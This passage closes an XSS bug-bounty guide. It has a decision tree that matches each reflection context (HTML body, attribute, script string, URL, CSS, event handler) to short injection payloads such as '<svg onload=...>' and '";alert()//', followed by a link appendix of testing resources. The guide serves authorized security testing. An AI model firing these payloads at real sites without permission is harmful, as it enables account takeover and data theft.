Did my unique MARKER appear in the raw HTTP response?
│
├─ NO  → does it appear in the DOM after JS runs? ── YES → DOM XSS (§11): trace source→sink, use DOM Invader
│                                                └── NO  → not reflected here; try another input / it's blind (§13)
│
└─ YES → WHERE exactly (View Source)?
         │
         ├─ Between tags <div>MARKER</div> ............ HTML body (§6): <svg onload=...>
         ├─ In a quoted attr value="MARKER" ........... Attr (§7): "><svg onload=...>  OR  " onfocus=.. autofocus
         ├─ In an unquoted attr value=MARKER .......... Attr (§7): <space> onmouseover=...
         ├─ Inside <script> var x="MARKER" ............ JS string (§8): ";alert()//
         ├─ In href/src/action="MARKER" ............... URL (§9): javascript:alert()
         ├─ In style="...MARKER..." ................... CSS (§10): break out / CSS exfil
         └─ Inside an on*="...MARKER..." handler ....... JS-in-attr (§7.3): ');alert()//  (entities allowed)

Then: are < > " ' surviving? (char probe, §5.2)
  All encoded?  → pivot context (attribute event / JS string / URL / DOM), or AngularJS CSTI {{}} (§15.3)
  Blocked by WAF? → §18.   Blocked by CSP? → §19.   Truncated? → §21.
Finally: EXECUTION confirmed (alert(document.domain)/collaborator)?  → go to IMPACT (Part IV) → report.
```

---

# Appendix C — Important Links

```
── Academy & standards ──
PortSwigger Web Security Academy — XSS    https://portswigger.net/web-security/cross-site-scripting
PortSwigger XSS cheat sheet               https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
OWASP XSS Prevention Cheat Sheet          https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
OWASP DOM XSS Prevention                  https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html
OWASP WSTG (XSS testing)                  https://owasp.org/www-project-web-security-testing-guide/
HackTricks — XSS                          https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting
The Hacker Recipes — XSS                  https://www.thehacker.recipes/web/inputs/xss

── Research & researchers (the deep source for mXSS · DOM · CSP · Trusted Types) ──
PortSwigger Research (Gareth Heyes)       https://portswigger.net/research   (mXSS, DOM XSS, CSP-bypass, Hackvertor)
Google Project Zero (browser/client-side) https://googleprojectzero.blogspot.com/
Cure53 (DOMPurify authors)                https://cure53.de/   ·   DOMPurify + bypass history: https://github.com/cure53/DOMPurify
Masato Kinugawa (mXSS / browser XSS)      https://mksben.l0.cm/
SonarSource research (library XSS/mXSS)   https://www.sonarsource.com/blog/
Black Hat / DEF CON — mutation XSS        Heiderich et al. "mXSS" / "The innerHTML Apocalypse" (mXSS foundational talks)
Bug-bounty writeups (real ATO chains)     HackerOne Hacktivity · https://github.com/reddelexc/hackerone-reports

── Payloads, cheatsheets, vectors ──
PayloadsAllTheThings — XSS                https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
HTML5 Security Cheatsheet (vectors)       https://html5sec.org/
Awesome XSS                               https://github.com/s0md3v/AwesomeXSS

── Specs (the parsing rules XSS abuses) ──
WHATWG HTML — parsing / tokenization      https://html.spec.whatwg.org/multipage/parsing.html
W3C — CSP 3 · Trusted Types               https://w3c.github.io/webappsec-csp/  ·  https://w3c.github.io/trusted-types/

── Tools & hands-on practice ──
Google CSP Evaluator                      https://csp-evaluator.withgoogle.com/
Dalfox / XSStrike / kxss / DOM Invader    (see §1)
XSS Hunter Express (self-host blind XSS)  https://github.com/mandatoryprogrammer/xsshunter-express
PentesterLab (hands-on XSS exercises)     https://pentesterlab.com/
CWE-79 / CWE-80 / CWE-116                  https://cwe.mitre.org/
```

---

> **Final reminder — the one rule that pays:** *Execution is the proof; impact is the finding.* Climb the impact ladder (§23) as far as the app allows, demonstrate it safely on your own accounts (§38), name the impact in the title (§39), and you'll convert `alert(document.domain)` into the bounty it's actually worth.
